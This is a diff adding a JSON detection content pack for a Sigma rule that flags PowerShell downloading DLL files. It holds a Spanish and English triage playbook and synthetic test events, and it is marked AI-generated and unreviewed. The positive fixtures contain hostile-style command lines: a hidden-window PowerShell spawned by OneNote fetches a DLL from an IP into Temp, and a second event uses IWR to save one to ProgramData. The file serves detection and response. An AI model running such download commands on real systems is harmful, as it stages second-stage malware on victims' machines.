@@ -1,0 +1,133 @@
+{
+  "rule": {
+    "id": "0f0450f3-8b47-441e-a31b-15a91dc243e2",
+    "title": "Potential DLL File Download Via PowerShell Invoke-WebRequest",
+    "level": "medium",
+    "status": "test",
+    "author": "Florian Roth (Nextron Systems), Hieu Tran",
+    "path": "windows/process_creation/proc_creation_win_powershell_download_dll.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_powershell_download_dll.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1059.001",
+      "T1105"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Un proceso ejecutó PowerShell con Invoke-WebRequest o Invoke-RestMethod (o sus alias IWR/IRM) para descargar desde una URL HTTP(S) un archivo .dll guardado en disco con -OutFile.",
+      "what_it_detects": "Eventos de creación de procesos cuyo CommandLine contiene Invoke-WebRequest, Invoke-RestMethod, IWR o IRM junto con 'http', 'OutFile' y '.dll', lo que indica la descarga de una posible DLL desde Internet.",
+      "why_it_matters": "Descargar DLL con PowerShell es una forma común de traer payloads de segunda etapa (T1105, Ingress Tool Transfer) mediante intérpretes de comandos (T1059.001), a menudo antes de cargarlas con rundll32, regsvr32 o side-loading.",
+      "triage_steps": [
+        "Revisar el CommandLine completo: URL, dominio o IP de origen, nombre de la DLL y ruta de -OutFile (Temp, AppData, ProgramData y Public son más sospechosas).",
+        "Identificar ParentImage y la cadena de procesos: Office, OneNote, wscript, mshta o cmd lanzando PowerShell sugieren phishing o ejecución inicial.",
+        "Validar el usuario y el host: ¿es un administrador o una cuenta de servicio con tareas de despliegue conocidas?",
+        "Consultar la reputación del dominio o IP y revisar logs de proxy y DNS para confirmar la descarga y su tamaño.",
+        "Obtener el hash de la DLL escrita y verificar firma digital, fecha de compilación y reputación en fuentes internas.",
+        "Buscar en el mismo host +/- 15 minutos procesos hijos como rundll32.exe o regsvr32.exe que carguen la DLL, persistencia o conexiones salientes nuevas.",
+        "Buscar el mismo dominio, URL o hash en otros endpoints y alertas previas del mismo usuario o host."
+      ],
+      "false_positives": [
+        "Scripts de administración o despliegue de software que descargan DLL desde repositorios internos o de proveedores conocidos.",
+        "Desarrolladores o pipelines de CI que obtienen bibliotecas o dependencias con Invoke-WebRequest.",
+        "Herramientas de soporte o RMM que actualizan componentes mediante PowerShell."
+      ],
+      "response_steps": [
+        "Confirmar con el usuario o el responsable del sistema si la descarga era esperada y documentar el origen.",
+        "Si no es legítima, aislar el endpoint y bloquear el dominio, URL o IP en proxy y firewall.",
+        "Preservar la DLL y la evidencia (memoria, logs de PowerShell) antes de poner el archivo en cuarentena.",
+        "Eliminar la DLL y cualquier persistencia asociada solo tras verificar el análisis; restablecer credenciales si hubo ejecución.",
+        "Buscar indicadores en toda la flota y ajustar exclusiones para orígenes legítimos verificados."
+      ],
+      "severity_rationale": "Nivel medio: el patrón es típico de entrega de malware, pero también aparece en scripts administrativos legítimos, por lo que requiere contexto antes de escalar."
+    },
+    "en": {
+      "summary": "A process ran PowerShell with Invoke-WebRequest or Invoke-RestMethod (or the IWR/IRM aliases) to download a .dll file from an HTTP(S) URL and save it to disk with -OutFile.",
+      "what_it_detects": "Process creation events whose CommandLine contains Invoke-WebRequest, Invoke-RestMethod, IWR or IRM together with 'http', 'OutFile' and '.dll', indicating a likely DLL download from the Internet.",
+      "why_it_matters": "Downloading DLLs with PowerShell is a common way to pull second-stage payloads (T1105, Ingress Tool Transfer) through a command interpreter (T1059.001), often before loading them via rundll32, regsvr32 or side-loading.",
+      "triage_steps": [
+        "Review the full CommandLine: source URL, domain or IP, DLL name and -OutFile path (Temp, AppData, ProgramData and Public are more suspicious).",
+        "Identify ParentImage and the process chain: Office, OneNote, wscript, mshta or cmd spawning PowerShell suggests phishing or initial execution.",
+        "Validate the user and host: is it an admin or service account with known deployment tasks?",
+        "Check domain or IP reputation and review proxy and DNS logs to confirm the download and its size.",
+        "Get the hash of the written DLL and check its signature, compile time and reputation in internal sources.",
+        "On the same host within +/- 15 minutes, look for rundll32.exe or regsvr32.exe loading the DLL, persistence, or new outbound connections.",
+        "Search for the same domain, URL or hash on other endpoints and earlier alerts for the same user or host."
+      ],
+      "false_positives": [
+        "Admin or software deployment scripts downloading DLLs from internal repositories or known vendors.",
+        "Developers or CI pipelines fetching libraries or dependencies with Invoke-WebRequest.",
+        "Support or RMM tools updating components through PowerShell."
+      ],
+      "response_steps": [
+        "Confirm with the user or system owner whether the download was expected and document the source.",
+        "If not legitimate, isolate the endpoint and block the domain, URL or IP at proxy and firewall.",
+        "Preserve the DLL and evidence (memory, PowerShell logs) before quarantining the file.",
+        "Remove the DLL and any related persistence only after analysis confirms it; reset credentials if execution occurred.",
+        "Hunt for the indicators fleet-wide and tune exclusions for verified legitimate sources."
+      ],
+      "severity_rationale": "Medium fits because the pattern is typical of malware delivery but also appears in legitimate admin scripts, so context is needed before escalating."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "PowerShell launched from OneNote downloads a DLL into Temp with Invoke-WebRequest and -OutFile.",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\ONENOTE.EXE",
+          "CommandLine": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri http://203.0.113.45/files/update.dll -OutFile C:\\Users\\jperez\\AppData\\Local\\Temp\\update.dll\"",
+          "ProcessId": 6844
+        }
+      },
+      {
+        "description": "Short IWR alias downloads a DLL over HTTPS to ProgramData.",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mrodriguez",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "powershell -c IWR https://cdn.example.org/a/libcore.dll -OutFile C:\\ProgramData\\libcore.dll",
+          "ProcessId": 7120
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Admin downloads an MSI installer with Invoke-WebRequest and -OutFile; no .dll in the command line.",
+        "event": {
+          "EventID": 1,
+          "Computer": "SRV-APP-03.andes.example.com",
+          "User": "ANDES\\adm_lgomez",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "CommandLine": "powershell.exe -Command \"Invoke-WebRequest -Uri https://downloads.example.com/agent/agent-setup.msi -OutFile C:\\Install\\agent-setup.msi\"",
+          "ProcessId": 4412
+        }
+      },
+      {
+        "description": "Invoke-RestMethod queries an API mentioning a .dll but writes no file (no OutFile).",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "powershell.exe -Command \"Invoke-RestMethod -Uri https://api.example.com/packages?name=helper.dll\"",
+          "ProcessId": 5230
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
